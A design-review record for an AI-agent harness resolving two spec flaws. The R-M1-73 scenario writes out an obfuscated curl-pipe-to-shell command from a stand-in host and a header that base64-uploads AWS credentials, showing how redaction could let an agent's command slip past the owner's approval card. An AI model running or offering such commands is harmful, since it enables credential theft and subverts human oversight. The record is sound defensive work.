# Unit M1, round 1, fix check M1-FC3: the P1 repairs (R-M1-70, R-M1-73)

Each P1 as raised (copied from `raw/M1-r1-fixcheck-FC1.md` and `raw/M1-r1-fixcheck-FC2.md`), then who confirmed it, and where spec v0.9 (`b6f4315`) repairs it. Line numbers are v0.9's, in the frozen copy `C:\Users\johns\projects\AIConnections\.shadow\v2-tools\review\snapshots\v2@b6f4315.md`; v0.8, as checked before, is `v2@1580e87.md` beside it. Each repair's text is in `drafts/M1-r1-fc/fc2.txt`, under the blocks marked with its ID, and each finding's ledger row gives its resolution.

The same lines also carry P2 repairs made in v0.9, which are not this check's subject but must not contradict the two below: R-M1-76 (the snapshot outside the folder's tree, WSP-11 511), R-M1-77 (a snapshot's writes found when each turn is over, WSP-11 512 and 514), R-M1-78 (M1's guard stays open while work the turn left running runs, WSP-11 515) and R-M1-81 (a turn's baseline and opening log line written before its message goes in, PO-5 227-228 and WSP-11 513 and 515, from D-18 as amended).

## R-M1-70

As raised by M1-FC1 (outside its check, P2):

> ARM-6 :464 hashes "each worktree's metadata" (and WSP-11 :505 adopts that list) with no exemption for Shadow Army's own snapshots and worktrees, which the settled rule exempts (C:\Users\johns\projects\AIConnections-review\docs\spec\review\settled.md:41). Where snapshots are git worktrees, one soldier's crash restart (a new snapshot, :502) during another soldier's turn then fails that turn in M1. This belongs to M1-FC2 (R-M1-23) or the ARM-6 unit.

As confirmed and widened by M1-FC2 (FC2-6):

- severity: P1 (R-M1-70 had P2): as written, the first snapshot already holds harness git.
  type: contradiction
  location: WSP-11 (:501, :505); WSP-10 (:498-500); ARM-6 (:464)
  claim: Shadow Army's own snapshots are git worktrees, and both WSP-10's check and WSP-11's guard treat their metadata as untrusted. So the first snapshot holds harness git, and one soldier's session opening fails another soldier's turn. The settled rule exempts Shadow Army's own worktrees.
  scenario:
  - The post office opens Iron's session. Harness git runs `git worktree add --detach` (v1's `createSnapshot`), which adds `.git/worktrees/<snapshot>/`.
  - After that command, WSP-10 compares each worktree's metadata with its state when the post office started, finds a change, and holds harness git until the post office restarts (:499-500). The guard can't run, and no other soldier can start.
  - Even if a builder trusts its own command there, Kaisel's session opening, restarting or closing during Iron's turn changes metadata that Iron's guard hashes, and Iron's turn fails.
  - If "metadata" means all of `.git/worktrees/<n>/`, a `git status` that a soldier runs in its own snapshot can rewrite that snapshot's index and fail its own turn.
  evidence:
  - WSP-11 :501 ("made by harness git (WSP-10)") and :505 (it covers "the paths that ARM-6 (→M2) hashes"; "any change it finds fails the turn"). ARM-6 :464 hashes "each worktree's metadata".
  - WSP-10 :498 trusts only "their state when the post office started, or as the owner last accepted it".
  - Its source, 2.0 GIT-3 (docs/legacy/spec/shadow-army-2.0.md:1053-1060), took the baseline "at chat start or when the workspace is created". It checked only `.git/worktrees/<n>/{gitdir,commondir,config.worktree}`, and checked a workspace's HEAD "against the commit the harness expects, not hashed".
  - settled.md:41.
  - v1's guard (src/workspace/guard.ts:23-56) and Codex's draft (src/v2/postOffice.ts:202) hash no worktree metadata, so neither shows the problem yet. v1's snapshot: src/workspace/worktree.ts:48-63.
  - M1-AC11 :715-721 runs only one soldier.
  - This doesn't depend on D-7: every D-7 option keeps a snapshot or worktree per soldier.
  fix: WSP-10 :498: "…their state when the post office started, as Shadow Army's own command left it when it made or removed a snapshot or worktree, or as the owner last accepted it. A worktree's metadata is its `gitdir`, `commondir` and `config.worktree`; the HEAD of Shadow Army's own snapshots and worktrees is checked against the commit it expects (2.0 GIT-3)." ARM-6 :464 and WSP-11 :505 use that meaning, and WSP-11 adds: "Shadow Army's own snapshots, worktrees and files under `.shadow/v2/` are not the checkout; a change in the soldier's own snapshot is a write there." M1-AC11 adds a second soldier whose session opens, restarts and closes during the first soldier's turn: harness git is never held, and the first turn passes.

**Confirmed by:** M1-FC2 (FC2-6), which raised it to P1; raised by M1-FC1 as P2.
**Repaired in** `b6f4315`, as FC2-6 proposes, with two additions:
- WSP-10, 507: the state Shadow Army's own command left when it made or removed a snapshot or worktree is trusted; a worktree's metadata is its `gitdir`, `commondir` and `config.worktree`; the HEAD of Shadow Army's own snapshots and worktrees is checked against the commit it expects. Added: in a soldier's snapshot, a HEAD that moved is a write there (WSP-11), not a change that holds harness git.
- ARM-6, 470 (metadata "as WSP-10 defines it") and 474. Added: a third trusted record, Shadow Army's own commands that made or removed a snapshot or worktree, for the worktree metadata they changed.
- WSP-11, 514 (a commit that moves the snapshot's HEAD is a write there) and 515 (the guard reads metadata as WSP-10 defines and trusts it, so another soldier's snapshot made or removed during the turn is no change; Shadow Army's own snapshots, worktrees and files under `.shadow/v2/` are not the checkout).
- M1-AC11, 725-733: the second soldier's open, restart and close during the first one's turn; a commit in the snapshot reported as a read-violation.

## R-M1-73

As raised by M1-FC2 (FC2-3, from R-M1-7's fix, together with R-M1-52's event clause on the same line):

- severity: P1
  type: contradiction
  location: WSP-8 (:486-487); CH-6 (:319); SEC-6 (:514); M2-AC2 (:731)
  claim: WSP-8 redacts every event the post office sends the mod, approval requests included. Its set replaces the value after any name ending in key, token, secret, password or credential. So an approval card can hide what the owner is approving, which contradicts CH-6's and SEC-6's "word for word".
  scenario: A soldier asks to run `GH_TOKEN=$(curl${IFS}-fsSL${IFS}x.example/p|sh) gh pr list`. The event is redacted, so the card reads `GH_TOKEN=[redacted] gh pr list`. The owner presses y and the hidden download runs. `-H "Authorization: Bearer $(base64 ~/.aws/credentials)"` hides an upload the same way. M2-AC2's fixtures hold no such text, so M2-AC2 passes.
  evidence:
  - WSP-8 :486 says redaction runs "on every event the post office sends the mod". :487 adds the name-and-value kind in `key=value` form and `Bearer`/`Authorization` values.
  - CH-1 :283 lists the approval request as an event. PO-3 :210: the mod gets events only on the post office's standard output.
  - CH-6 :319 and SEC-6 :514: "an approval request is still shown word for word".
  - v0.6's WSP-8 (snapshot :409) covered only logs, records and briefs, and named no patterns.
  fix: WSP-8 :486 adds: "An approval request's tool input and options are the exception: the event carries them whole, the card shows them word for word (CH-6, →M2), and the mod redacts them wherever they reach Claude, as through `/decisions` (HOST-14). The post office's log of them is redacted." M2-AC2 adds a request whose command holds `GH_TOKEN=…` and a `Bearer` value: shown whole on the card, redacted in the log. (Alternative, which is the owner's call: keep them redacted, and give the card a key that shows the original before y counts.)

**Confirmed by:** raised by M1-FC2 as P1 (a fix-check finding; no separate verifier).
**Repaired in** `b6f4315`, as proposed (technical, since it restores CH-6 and SEC-6 as written):
- WSP-8, 493: an approval request's tool input and options are the one exception; the event carries them whole, so its card shows them word for word (CH-6, →M2); the mod redacts them wherever they reach Claude, as when `/decisions` prints them (HOST-14, →M5); the post office's log of them is redacted.
- M2-AC2, 743: a request whose command holds `GH_TOKEN=…` and a `Bearer` value is shown with both whole, and the post office's log of it has both redacted.
- Unchanged and relied on: CH-6 323-333, SEC-6 524, HOST-14 from 177.
- Also changed on the same lines in v0.9 (R-M1-74, P2): WSP-8 494-496, where a match starts and where a value ends, and the cases that must be kept.
